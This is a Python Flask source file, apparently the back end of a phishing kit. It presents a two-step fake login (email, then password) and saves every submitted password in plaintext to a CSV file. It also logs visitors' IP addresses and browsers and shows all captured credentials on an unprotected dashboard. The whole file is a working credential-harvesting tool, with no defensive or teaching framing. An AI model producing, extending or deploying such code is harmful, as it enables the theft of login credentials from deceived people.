from flask import Flask, request, render_template, redirect, url_for, session
import csv
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'super-secret-key'  # Requis pour la session

LOG_DIR = 'logs'
CREDS_FILE = os.path.join(LOG_DIR, 'creds.csv')
ACCESS_LOG_FILE = os.path.join(LOG_DIR, 'access_log.csv')

# Assurez-vous que les fichiers existent
os.makedirs(LOG_DIR, exist_ok=True)

if not os.path.exists(CREDS_FILE):
    with open(CREDS_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Email', 'Password', 'Timestamp'])

if not os.path.exists(ACCESS_LOG_FILE):
    with open(ACCESS_LOG_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['IP', 'User-Agent', 'Timestamp'])

# Page email (1ère étape)
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        session['email'] = request.form.get('email')
        return redirect('/password')

    # Log visite
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(ACCESS_LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([ip, ua, now])
        
    return render_template('login.html')

# Page mot de passe (2ème étape)
@app.route('/password', methods=['GET', 'POST'])
def password():
    email = session.get('email')
    if not email:
        return redirect('/')

    if request.method == 'POST':
        password = request.form.get('password')
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(CREDS_FILE, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([email, password, now])
        return redirect(url_for('login_success'))

    return render_template('password.html', email=email)

# Page success
@app.route('/success')
def login_success():
    return render_template('success.html')

# Dashboard admin
@app.route('/dashboard')
def dashboard():
    with open(CREDS_FILE, 'r') as f:
        reader = csv.reader(f)
        next(reader)  # skip header
        creds = list(reader)

    with open(ACCESS_LOG_FILE, 'r') as f:
        reader = csv.reader(f)
        next(reader)  # skip header
        visitors = list(reader)

    return render_template('dashboard.html', creds=creds, visitors=visitors)
if __name__ == '__main__':
    app.run(debug=True)
# Port pour Replit ou local
#port = int(os.environ.get("PORT", 5000))
#app.run(host="0.0.0.0", port=port)
